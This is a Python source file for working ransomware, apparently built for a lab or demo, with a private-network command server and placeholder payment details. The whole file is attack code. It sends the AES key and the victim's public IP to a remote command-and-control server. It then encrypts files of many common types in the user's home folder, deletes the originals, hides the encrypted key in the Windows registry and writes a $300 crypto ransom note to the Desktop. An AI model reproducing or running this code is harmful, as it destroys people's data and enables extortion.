# Lock (encrypt) all .txt, etc... files in the directory, store encrypted key in registry

"""
1. Generate AES session key.
2. Send key to remote server
3. Encrypt AES session key with public RSA key
4. Traverse system
5. Encrypt all files ending in (.txt, ...) with AES session key (refer to example)
"""
import os
import winreg as reg
from pathlib import Path
from base64 import b64encode 
from requests import post, get
from Cryptodome.PublicKey import RSA
from tempfile import NamedTemporaryFile
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.Random import get_random_bytes

tgt_exts = ['txt', 'png', 'jpg', 'pdf', 'docx', 'mp3', 'mov', 'md', 'bat', 'py', 'mp4', 'doc', 'js', 'c', 'java', '7z', 'bz2', 'zip', 'gz', 'tar', 'gif', 'html', 'h', 'sln', 'vcproj']
REMOTE_C2='http://192.168.230.128:9000'
PUBLIC_KEY='''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkhgXKdG6b2S3AjafAdmc
0g0+saoV+Vn/nh0oDceLTiX7qenMwJGAvCSaGZTDXv+nbfSIs6nLVd4jkgdpUyL2
u2gpVPRMXP/NEJSaPDUq0s1uvpBl5ujgjWCnfXOcSjzaizL/tqBqRm9jrBDdnogF
Z40xKMePxWvukP3XzREFDaoBlYlzjv7rg4jz9NzRNlCoC5GWajkp7/Q4cums82nq
zBQoT1vI6+5UlSU+GDVertMNRCTb+HabkPVLAGvG4qncBoHlnxuDQ2Grl6+3njOr
sw+uykWsefFxO1VIaVnDQIMZQ+JMCiCErdzTpzwNj6HUG7ER8bp7MCLgRoGhuooP
MQIDAQAB
-----END PUBLIC KEY-----'''

def main():
    # Check if killswitch domain registered:
    try:
        d = get('https://666examplenotfoundhere0x0x0x0.org')
        if d.status_code == 200:
            print('Kill switch: Exiting..')
            return
    except: pass

    # Generate AES session key
    aes = get_random_bytes(16)

    # Send data to remote server
    publicIP = get('https://api.ipify.org').text
    userInfo = '\tUser: ' + publicIP + '\n\tKey: ' + str(b64encode(aes))
    print(userInfo)
    try:
        req = post(REMOTE_C2, data=userInfo, timeout=5)
    except:
        print('--> Did not send data, unable to connect to remote server')

    public = RSA.import_key(PUBLIC_KEY.encode())

    # Encrypt AES key with public RSA key
    c_rsa = PKCS1_OAEP.new(public)
    enc_aes = c_rsa.encrypt(aes)
    #print('\tEncrypted AES key: ' + str(enc_aes)) # Testing
    
    # Traverse system, encrypt files with AES session key using algorithm
    #traverse_path = os.getcwd() # Start of traverse path -- FOR TESTING
    traverse_path = os.path.expanduser('~') # Start of traverse path -- FOR DEMO
    sys_files = os.walk(traverse_path) 
    for root, dir, files in sys_files:
        for file in files:
            c_aes = AES.new(aes, AES.MODE_EAX)
            if file.split('.')[1] in tgt_exts:
                print('x ' + root + '\\' + file)
                path = root + '\\' + file
                # read current file
                with open(path, 'rb') as f:
                    data = f.read()
                ciphertext, tag = c_aes.encrypt_and_digest(data)
                # write en data into new
                newf = path+'.encrypted'
                with open(newf, 'wb') as f:
                    [ f. write(x) for x in (enc_aes, c_aes.nonce, tag, ciphertext)]

                os.remove(path)

    # After done encrypting all files, write temp file of encrypted session key
    cwd = Path.cwd()
    f_path = '' # Temp file name
    r_key = reg.HKEY_CURRENT_USER
    with NamedTemporaryFile(dir=cwd) as tmpf:
        tmpf.write(enc_aes)
        f_path = tmpf.name
    # Write encrypted session key (in b64) tempfile to registry before deleting
        try:
            key = reg.CreateKey(r_key, f_path)
            reg.SetValue(key, 'NO-ACCESS', reg.REG_SZ, str(b64encode(enc_aes)))
            if key:
                reg.CloseKey(key)
        except Exception as e:
            print('\tError writing to registry: ' + e)

        tmpf.flush()

    # Show ransom message
    r_msg='''Oh no, your files are encrypted!
Your IP: %s
It look like you won't be able to access quite a few of them. However,
we can guarantee you can get them back, if you do the following. 

    1. Send a payment worth $300 to the crypto wallet: 

        bc1xxxxxxxxxxxxxxxxxxxxxxx


    2. Send your crypto wallet ID & personal key to e-mail: xxxxx@posteo.net

        Your personal key:
            %s


You will receive a Decryption software in the inbox of the email used to send your key. 
Once run, all your files will be successfully restored. Failure to follow these steps may
result in your files being lost forever.
Thank you!''' % (publicIP, str(b64encode(aes)))

    with open(os.path.expanduser('~')+'\\Desktop\\YOUR-FILES-ARE-ENCRYPTED.txt', 'w') as f:
        f.write(r_msg)
        f.flush()
    print("Job Done")

if __name__ == '__main__':
    main()